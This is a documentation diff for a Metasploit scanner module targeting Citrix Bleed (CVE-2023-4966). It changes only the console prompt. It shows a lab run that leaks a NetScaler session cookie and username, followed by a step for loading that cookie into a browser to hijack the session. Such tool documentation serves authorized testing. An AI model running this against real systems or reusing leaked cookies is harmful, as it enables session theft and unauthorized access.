@@ -22,7 +22,7 @@ Specific demo of using the module that might be useful in a real world scenario.
 NetScaler VPX instance for VMware ESX from `NSVPX-ESX-13.1-48.47_nc_64`.
 
 ```
-msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > show options 
+msf auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > show options 
 
 Module options (auxiliary/scanner/http/citrix_bleed_cve_2023_4966):
 
@@ -39,12 +39,12 @@ Module options (auxiliary/scanner/http/citrix_bleed_cve_2023_4966):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > run
+msf auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > run
 
 [+] Cookie: NSC_AAAC=fdac8de9ed76012688b4d33e9d5f74b00c3a0818745525d5f4f58455e445a4a42 Username: metasploit
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) >
+msf auxiliary(scanner/http/citrix_bleed_cve_2023_4966) >
 ```
 
 Once the cookie has been leaked, load it into the browser using the developer tools.
